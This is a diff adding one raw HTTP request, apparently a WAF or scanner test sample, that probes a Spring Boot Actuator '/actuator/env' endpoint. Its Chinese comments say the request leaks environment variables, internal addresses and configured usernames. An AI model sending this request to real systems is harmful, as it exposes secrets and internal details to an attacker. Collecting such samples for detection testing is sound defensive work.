@@ -1,0 +1,9 @@
+# 文件包含_配置文件泄露_spring-06506891
+# 请求env会直接泄露环境变量、内网地址、配置中的用户名等信息
+GET /actuator/env?acid=06506891&bid=hd_tag_m8mv24vu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24vu
+RM-PRO-Token: bcfe9c56e28bcdf408cbd596baaad7e9
+RM-PRO-Time: 1742808417448
+User-Agent: curl/7.83.1
+
